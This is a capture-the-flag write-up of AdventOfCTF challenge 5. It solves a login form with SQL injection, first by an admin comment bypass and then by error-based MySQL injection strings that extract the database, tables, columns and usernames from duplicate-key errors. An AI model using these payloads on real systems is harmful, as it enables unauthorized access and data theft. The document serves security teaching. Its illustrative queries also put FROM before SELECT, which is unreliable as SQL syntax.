+++
author = "Maik de Kruif"
title = "Classic"
subtitle = "Challenge 5 - AdventOfCTF"
date = 2020-12-05T08:57:31+01:00
description = "A writeup for challenge 5 of AdventOfCTF."
cover = "img/writeups/adventofctf/2020/080b5d5fcaf13167d2e7e8871fdc8ded.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "sql-injection",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
aliases = [
    "challenge_5"
]
+++

- Points: 500

## Description

Again a login form stands in your way. What powerful 'hacker' tool will help you proceed?

Visit <https://05.adventofctf.com> to start the challenge.

## Finding the vulnerability

Upon opening the challenge website, we're, yet again, greeted with a login form. As the last few challenges used javascript I immediately opened the devtools to have a look at the sources. But, no javascript! This time it looks like the form is actually submitted. Below the form there is also some text: "A classic, with a twist.". When talking about forms, a classic exploit is SQL Injection. So let's try that.

### SQL Injection

My first try was to submit a quote `'` as the username and some garbage password. This is a common check for SQLi and if it works it throws an error:

```text
Error description: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'sd'' at line 1
```

But how does this work in the first place?

#### Background

When a login form on a website is submitted, the website often connects to a database to check the login credentials. On most website this database is a SQL database.

Here's an example of a query to check login credentials:

```sql
FROM `users` SELECT * WHERE `username`='' AND `password`=''
```

_Note: the backticks (\`) mean the content of it is a column in the database._

The username and password values are inserted in this query and if there is a result, the database will return it.

#### Vulnerability

Now that we know how it works, we can try to exploit it. Take my first input for example (`'`) and see what the resulting query would be.

```sql
FROM `users` SELECT * WHERE `username`=''' AND `password`='garbage'
```

The query becomes invalid as there is an unterminated string. So, how do we turn this query into one that logs us in as the admin?

## Solution

Firstly, I tried to use `' OR 1=1 -- ` as the username and, again, some garbage as the password. However, it didn't work. It didn't even return an error. So I guess this is where "A classic, with a twist." comes in. Next, I tried to just use `admin` as the username and end the query after it by inserting a comment (this is `--` in sql). The resulting input would become `admin' -- ` for the username, the password doesn't matter.

The resulting query would be this:

```sql
FROM `users` SELECT * WHERE `username`='admin' -- ' AND `password`='garbage'
```

As we can see, it now only checks the username. I submitted the form and, I got the flag! It is `NOVI{th3_classics_with_a_7wis7}`

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#5-6).

## EDIT

As [@credmp](https://twitter.com/credmp) correctly pointed out, this only works if you can guess the username. If you can't, you'll have to get it first. I'll explain how to do that here.

### Getting the database

As we can see the error on the page itself, we can use a query to give a result inside the error. For instance, to get the database I used the following input: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `. This results into the following query:

```sql
FROM `users` SELECT * WHERE `username`='' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) as x FROM information_schema.tables GROUP BY x) as y) -- ' AND `password`=''
```

After submitting the form it gives us the following error:

```text
Error description: Duplicate entry 'testdb:1' for key 'group_key'
```

#### How does this work?

Firstly, I'll format the query for you:

```sql
FROM `users`
SELECT *
WHERE `username`='' AND (
  SELECT 1 FROM (
    SELECT COUNT(*), CONCAT(
      (
        SELECT database()
      ),
      0x3a,
      FLOOR(RAND(0)*2)
    ) AS x
    FROM information_schema.tables GROUP BY x
  ) AS y) -- ' AND `password`=''
```

Now let me explain this query.

We start with an `AND` to get another value, which is a nested SQL query. This query selects `1`, this is just because we actually need a value. Now we get to the important bit:

```sql
SELECT COUNT(*), CONCAT(
  (
    SELECT database()
  ),
  0x3a,
  FLOOR(RAND(0)*2)
) AS x
FROM information_schema.tables GROUP BY x
```

Here, we select `COUNT(*)` and a string `CONCAT()` with the alias `x`. This `CONCAT()` contains the SQL query we actually want to execute. I can, however, only return one row. The `CONCAT()` also contains `0x3a` which is ASCII for a `:` character so we know where the value we want ends and `FLOOR(RAND(0)*2)`. The purpose of it is to get a duplicate entry error in the `GROUP BY` as it will result in the following values:

```sql
> SELECT FLOOR(RAND(0)*2)x FROM information_schema.tables;
+---+
| x |
+---+
| 0 |
| 1 |
| 1 | <-- The error will occur here.
| 0 |
| 1 |
| 1 |
 ...
```

The error really occurs because of a bug in MySQL. The `COUNT(*)` and `GROUP BY` should give multiple rows as the output, however, MySQL throws an error.

The `FROM` in this query can be any table with three or more rows. `information_schema.tables` is just a common one.

Now we know the name of the database (`testdb`), we can get the tables in it.

### Getting the tables

We can only get the tables one by one (as I explained above) so we can use the following sub-query:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='testdb' LIMIT 0,1
```

Converted to an input we get `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema='testdb' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `

_Note: to get next table, just edit the `LIMIT` to `1,1`, `2,1` and so on_

Which returns:

```text
Error description: Duplicate entry 'users:1' for key 'group_key'
```

Now that we know the table (`users`), we can get it's columns

### Getting the columns

A sub-query for columns could be the following:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1
```

Which converts to this input: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `

Which gives us (with other `LIMIT` as well):

```text
Error description: Duplicate entry 'USER:1' for key 'group_key'
Error description: Duplicate entry 'CURRENT_CONNECTIONS:1' for key 'group_key'
Error description: Duplicate entry 'TOTAL_CONNECTIONS:1' for key 'group_key'
Error description: Duplicate entry 'username:1' for key 'group_key'
Error description: Duplicate entry 'password:1' for key 'group_key'
```

The first three we can just ignore as they are default metrics from MySQL. So our resulting columns would be `username` and `password`

### Getting its contents

Because we only care for the username, we can discard the password.

A simple `SELECT` query for the username would be:

```sql
SELECT username from users limit 0,1
```

Turing this into an input we get `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username from users limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `

We get:

```text
Error description: Duplicate entry 'nottheuser:1' for key 'group_key'
Error description: Duplicate entry 'admin:1' for key 'group_key'
```

Which means our users are `nottheuser` and `admin`.
